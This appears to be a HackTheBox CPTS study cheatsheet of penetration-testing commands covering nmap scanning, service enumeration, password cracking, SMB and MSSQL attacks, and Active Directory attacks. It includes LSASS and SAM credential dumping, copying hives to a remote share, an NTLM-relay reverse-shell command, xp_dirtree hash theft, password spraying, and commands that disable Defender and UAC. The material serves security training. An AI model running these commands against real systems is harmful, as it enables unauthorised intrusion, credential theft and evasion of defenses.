# CPTS-cheatsheet
HackTheBox Certified Penetration Tester Specialist Cheatsheet


## [Tmux](https://tmuxcheatsheet.com/)
```
# Start a new tmux session
tmux new -s <name>

# Start a new session or attach to an existing session named mysession
tmux new-session -A -s <name>

# List all sessions
tmux ls

# kill/delete session
tmux kill-session -t <name>

# kill all sessions but current
tmux kill-session -a

# attach to last session
tmux a
tmux a -t <name>
```

## [NMAP](https://www.stationx.net/nmap-cheat-sheet/)
#### Nmap address scanning
```
# Scan a single IP
nmap 192.168.1.1

# Scan multiple IPs
nmap 192.168.1.1 192.168.1.2

# Scan a range
nmap 192.168.1.1-254

# Scan a subnet
nmap 192.168.1.0/24
```
#### Nmap scanning techniques
```
# TCP SYN port scan (Default)
nmap -sS 192.168.1.1

# TCP connect port scan (Default without root privilege)
nmap -sT 192.168.1.1

# UDP port scan
nmap -sU 192.168.1.1

# TCP ACK port scan
nmap  -sA 192.168.1.1
```
#### Nmap Host Discovery
```
# Disable port scanning. Host discovery only.
nmap -sn 192.168.1.1

# Disable host discovery. Port scan only.
nmap -Pn 192.168.1.1

# Never do DNS resolution
nmap -n 192.168.1.1

```

#### Nmap port scan
```
# Port scan from service name
nmap 192.168.1.1 -p http, https

# Specific port scan
nmap 192.168.1.1 -p 80,9001,22

# All ports
nmap 192.168.1.1 -p-

# Fast scan 100 ports
nmap -F 192.168.1.1

# Scan top ports
nmap 192.168.1.1 -top-ports 200
```

#### Nmap OS and service detection
```
# Aggresive scanning (Bad Opsec). Enables OS detection, version detection, script scanning, and traceroute.
nmap -A 192.168.1.1

# Version detection scanning
nmap -sV 192.168.1.1

# Version detection intensity from 0-9
nmap -sV -version-intensity 7 192.168.1.1

# OS detecion
nmap -O 192.168.1.1

# Hard OS detection intensity
nmap -O -osscan-guess 192.168.1.1
```

#### Nmap timing and performance
```
# Paranoid (0) Intrusion Detection System evasion
nmap 192.168.1.1 -T0

# Insane (5) speeds scan; assumes you are on an extraordinarily fast network
nmap 192.168.1.1 -T5

# Send packets no slower than <number> per second
nmap 192.168.1.1 --min-rate 1000
```
#### NSE Scripts
```
# Scan with a single script. Example banner
nmap 192.168.1.1 --script=banner

# NSE script with arguments
nmap 192.168.1.1 --script=banner --script-args <arguments>
```
#### Firewall / IDS Evasion and Spoofing
```
# Requested scan (including ping scans) use tiny fragmented IP packets. Harder for packet filters
nmap -f 192.168.1.1

# Set your own offset size(8, 16, 32, 64)
nmap 192.168.1.1 --mtu 32

# Send scans from spoofed IPs
nmap 192.168.1.1 -D 192.168.1.11, 192.168.1.12, 192.168.1.13, 192.168.1.13 
```
#### Output
```
# Normal output to the file normal.file
nmap 192.168.1.1 -oN scan.txt

# Output in the three major formats at once
nmap 192.168.1.1 -oA scan
```
## Footprinting Services
##### FTP
```
# Connect to FTP
ftp <IP>

# Interact with a service on the target.
nc -nv <IP> <PORT>

# Download all available files on the target FTP server
wget -m --no-passive ftp://anonymous:anonymous@<IP>
```
##### SMB
```

# Connect to a specific SMB share
smbclient //<FQDN IP>/<share>

# Interaction with the target using RPC
rpcclient -U "" <FQDN IP>

# Enumerating SMB shares using null session authentication.
crackmapexec smb <FQDN/IP> --shares -u '' -p '' --shares
```
##### NFS
```
# Show available NFS shares
showmount -e <IP>

# Mount the specific NFS share.umount ./target-NFS
mount -t nfs <FQDN/IP>:/<share> ./target-NFS/ -o nolock
```
##### DNS
```
# NS request to the specific nameserver.
dig ns <domain.tld> @<nameserver>

# ANY request to the specific nameserver
dig any <domain.tld> @<nameserver>

# AXFR request to the specific nameserver.
dig axfr <domain.tld> @<nameserver>
```

##### IMAP/POP3
```
# Log in to the IMAPS service using cURL
curl -k 'imaps://<FQDN/IP>' --user <user>:<password>

# Connect to the IMAPS service
openssl s_client -connect <FQDN/IP>:imaps

# Connect to the POP3s service
openssl s_client -connect <FQDN/IP>:pop3s
```

#### SNMP
```
# Querying OIDs using snmpwalk
snmpwalk -v2c -c <community string> <FQDN/IP>

# Bruteforcing community strings of the SNMP service.
onesixtyone -c community-strings.list <FQDN/IP>

# Bruteforcing SNMP service OIDs.
braa <community string>@<FQDN/IP>:.1.*
```
##### MSSQL
```
impacket-mssqlclient <user>@<FQDN/IP> -windows-auth
```
##### IPMI
```
# IPMI version detection
msf6 auxiliary(scanner/ipmi/ipmi_version)

# Dump IPMI hashes
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes)
```
##### Linux Remote Management SSH
```
# Enforce password-based authentication
ssh <user>@<FQDN/IP> -o PreferredAuthentications=password
```
## Password Attacks

##### Password Mutations
```
# Uses cewl to generate a wordlist based on keywords present on a website.
cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist

# Uses Hashcat to generate a rule-based word list.
hashcat --force password.list -r custom.rule --stdout > mut_password.list

# Users username-anarchy tool in conjunction with a pre-made list of first and last names to generate a list of potential username.
./username-anarchy -i /path/to/listoffirstandlastnames.txt
```

##### Remote Password Attacks
```
# Uses Hydra in conjunction with a user list and password list to attempt to crack a password over the specified service.
hydra -L user.list -P password.list <service>://<ip>

# Uses Hydra in conjunction with a list of credentials to attempt to login to a target over the specified service. This can be used to attempt a credential stuffing attack.
hydra -C <user_pass.list> ssh://<IP>

# Uses CrackMapExec in conjunction with admin credentials to dump password hashes stored in SAM, over the network.
crackmapexec smb <ip> --local-auth -u <username> -p <password> --sam

# Uses CrackMapExec in conjunction with admin credentials to dump lsa secrets, over the network. It is possible to get clear-text credentials this way.
crackmapexec smb <ip> --local-auth -u <username> -p <password> --lsa

# Uses CrackMapExec in conjunction with admin credentials to dump hashes from the ntds file over a network.
crackmapexec smb <ip> -u <username> -p <password> --ntds
```
##### Windows Password Attacks
```
# Uses Windows command-line based utility findstr to search for the string "password" in many different file type.
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml

# A Powershell cmdlet is used to display process information. Using this with the LSASS process can be helpful when attempting to dump LSASS process memory from the command line.
Get-Process lsass

# Uses rundll32 in Windows to create a LSASS memory dump file. This file can then be transferred to an attack box to extract credentials.
rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full

# Uses Pypykatz to parse and attempt to extract credentials & password hashes from an LSASS process memory dump file.
pypykatz lsa minidump /path/to/lsassdumpfile

# Uses reg.exe in Windows to save a copy of a registry hive at a specified location on the file system. It can be used to make copies of any registry hive (i.e., hklm\sam, hklm\security, hklm\system).
reg.exe save hklm\sam C:\sam.save

# Uses move in Windows to transfer a file to a specified file share over the network.
move sam.save \\<ip>\NameofFileShare

# Uses Windows command line based tool copy to create a copy of NTDS.dit for a volume shadow copy of C:.
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
```
##### Linux Password Attacks
```
# Script that can be used to find .conf, .config and .cnf files on a Linux system.
for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib|fonts|share|core" ;done

# Script that can be used to find credentials in specified file types.
for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc|lib");do echo -e "\nFile: " $i; grep "user|password|pass" $i 2>/dev/null | grep -v "\#";done

# Script that can be used to find common database files.
for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc|lib|headers|share|man";done

# Uses Linux-based find command to search for text files.
find /home/* -type f -name "*.txt" -o ! -name "*.*"

# Uses Linux-based command grep to search the file system for key terms PRIVATE KEY to discover SSH keys.
grep -rnw "PRIVATE KEY" /* 2>/dev/null | grep ":1"
```
##### Cracking Passwords
```
# Uses Hashcat to attempt to crack a single NTLM hash and display the results in the terminal output.
hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt --show

# Runs John in conjunction with a wordlist to crack a pdf hash.
john --wordlist=rockyou.txt pdf.hash

# Uses unshadow to combine data from passwd.bak and shadow.bk into one single file to prepare for cracking.
unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes

# Uses Hashcat in conjunction with a wordlist to crack the unshadowed hashes and outputs the cracked hashes to a file called unshadowed.cracked.
hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked

# Runs Office2john.py against a protected .docx file and converts it to a hash stored in a file called protected-docx.hash.
office2john.py Protected.docx > protected-docx.hash
```
## Attacking Common Services

##### Attacking SMB

```
# Network share enumeration using smbmap.
smbmap -H 10.129.14.128

# Null-session with the rpcclient.
rpcclient -U'%' 10.10.110.17

# Execute a command over the SMB service using crackmapexec.
crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec

# Extract hashes from the SAM database.
crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam

# Dump the SAM database using impacket-ntlmrelayx.
impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146

# Execute a PowerShell based reverse shell using impacket-ntlmrelayx.
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e <base64 reverse shell>
```
##### Attacking SQL
```
# SQLEXPRESS
EXECUTE sp_configure 'show advanced options', 1
EXECUTE sp_configure 'xp_cmdshell', 1
RECONFIGURE
xp_cmdshell 'whoami'

# Hash stealing using the xp_dirtree command in MSSQL.
EXEC master..xp_dirtree '\\10.10.110.17\share\'

# Hash stealing using the xp_subdirs command in MSSQL.
EXEC master..xp_subdirs '\\10.10.110.17\share\'

# Identify the user and its privileges used for the remote connection in MSSQL.
EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
```
##### Attacking Email Services
```
# DNS lookup for mail servers for the specified domain
host -t MX microsoft.com

#  DNS lookup for mail servers for the specified domain
dig mx inlanefreight.com | grep "MX" | grep -v ";"

#  DNS lookup of the IPv4 address for the specified subdomain.
host -t A mail1.inlanefreight.htb.

# Connect to the SMTP server.
telnet 10.10.110.20 25

# SMTP user enumeration using the RCPT command against the specified host
smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7

# Brute-forcing the POP3 service.
hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3

# Testing the SMTP service for the open-relay vulnerability.
swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Notification' --body 'Message' --server 10.10.11.213
```
## Active Directory
#### Initial Enumeration
```
# Performs a ping sweep on the specified network segment from a Linux-based host
fping -asgq 172.16.5.0/23

# Runs the Kerbrute tool to discover usernames in the domain (INLANEFREIGHT.LOCAL) specified proceeding the -d option and the associated domain controller specified proceeding --dcusing a wordlist and outputs (-o) the results to a specified file. Performed from a Linux-based host.
./kerbrute_linux_amd64 userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o kerb-results
```
##### LLMNR/NTB-NS Poisoning
```
# Uses hashcat to crack NTLMv2 (-m) hashes that were captured by responder and saved in a file (frond_ntlmv2). The cracking is done based on a specified wordlist.
hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt
```
##### Password Spraying & Password Policies
```
# Uses CME to extract  password policy
crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol

# Uses rpcclient to discover information about the domain through SMB NULL sessions. Performed from a Linux-based host.
rpcclient -U "" -N 172.16.5.5

# Uses rpcclient to enumerate the password policy in a target Windows domain from a Linux-based host.
rpcclient $> querydominfo

# Uses ldapsearch to enumerate the password policy in a target Windows domain from a Linux-based host.
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

# Used to enumerate the password policy in a Windows domain from a Windows-based host.
net accounts

# PowerView Command used to enumerate the password policy in a target Windows domain from a Windows-based host.
Get-DomainPolicy

# Uses rpcclient to discover user accounts in a target Windows domain from a Linux-based host.
rpcclient -U "" -N 172.16.5.5 rpcclient $> enumdomuser

# Uses CrackMapExec to discover users (--users) in a target Windows domain from a Linux-based host.
crackmapexec smb 172.16.5.5 --users

# Uses ldapsearch to discover users in a target Windows doman, then filters the output using grep to show only the sAMAccountName from a Linux-based host.
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" "

# Uses kerbrute and a list of users (valid_users.txt) to perform a password spraying attack against a target Windows domain from a Linux-based host.
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1

# Uses CrackMapExec and the --local-auth flag to ensure only one login attempt is performed from a Linux-based host. This is to ensure accounts are not locked out by enforced password policies. It also filters out logon failures using grep.
sudo crackmapexec smb --local-auth 172.16.5.0/24 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +

# Performs a password spraying attack and outputs (-OutFile) the results to a specified file (spray_success) from a Windows-based host.
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```
#### [Enumerating Disabling/Bypassing AV](https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/defense-evasion/disable-defender)
```
# Check if Defender is enabled
Get-MpComputerStatus
Get-MpComputerStatus | Select AntivirusEnabled

# Check if defensive modules are enabled
Get-MpComputerStatus | Select RealTimeProtectionEnabled, IoavProtectionEnabled,AntispywareEnabled | FL

# Check if tamper protection is enabled
Get-MpComputerStatus | Select IsTamperProtected,RealTimeProtectionEnabled | FL

# Check for alternative Av products
Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct

# Disabling UAC
cmd.exe /c "C:\Windows\System32\cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f"

# Disables realtime monitoring
Set-MpPreference -DisableRealtimeMonitoring $true

# Disables scanning for downloaded files or attachments
Set-MpPreference -DisableIOAVProtection $true

# Disable behaviour monitoring
Set-MPPreference -DisableBehaviourMonitoring $true

# Make exclusion for a certain folder
Add-MpPreference -ExclusionPath "C:\Windows\Temp"

# Disables cloud detection
Set-MPPreference -DisableBlockAtFirstSeen $true

# Disables scanning of .pst and other email formats
Set-MPPreference -DisableEmailScanning $true

# Disables script scanning during malware scans
Set-MPPReference -DisableScriptScanning $true

# Exclude files by extension
Set-MpPreference -ExclusionExtension "ps1"

# Turn off everything and set exclusion to "C:\Windows\Temp"
Set-MpPreference -DisableRealtimeMonitoring $true;Set-MpPreference -DisableIOAVProtection $true;Set-MPPreference -DisableBehaviorMonitoring $true;Set-MPPreference -DisableBlockAtFirstSeen $true;Set-MPPreference -DisableEmailScanning $true;Set-MPPReference -DisableScriptScanning $true;Set-MpPreference -DisableIOAVProtection $true;Add-MpPreference -ExclusionPath "C:\Windows\Temp"

# Bypassing with path exclusion
Add-MpPreference -ExclusionPath "C:\Windows\Temp"

# PowerShell cmd-let used to view AppLocker policies from a Windows-based host.
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```
#### [Living Of The Land](https://lolbas-project.github.io/#)
Get-Module - PowerShell cmd-let used to list all available modules, their version and command options from a Windows-based host


Import-Module ActiveDirectory - Loads the Active Directory PowerShell module from a Windows-based host.


Get-ADDomain - PowerShell cmd-let used to gather Windows domain information from a Windows-based host.


Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName - PowerShell cmd-let used to enumerate user accounts on a target Windows domain and filter by ServicePrincipalName. Performed from a Windows-based host.


